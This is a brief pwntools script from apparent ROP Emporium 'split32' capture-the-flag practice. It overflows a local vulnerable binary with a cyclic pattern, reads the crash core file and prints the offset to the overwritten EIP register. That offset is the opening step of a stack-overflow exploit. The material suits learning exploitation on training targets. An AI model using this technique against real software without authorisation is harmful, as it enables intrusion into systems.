from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge2/x32/split32'

bin= ELF(bin)
context.binary = bin
context.log_level = 'info'

p= process(bin.path)
p.sendline(cyclic(200))
p.wait_for_close()
core= p.corefile
eip= core.eip

offset= cyclic_find(eip) 
print(f"Found offset {offset}")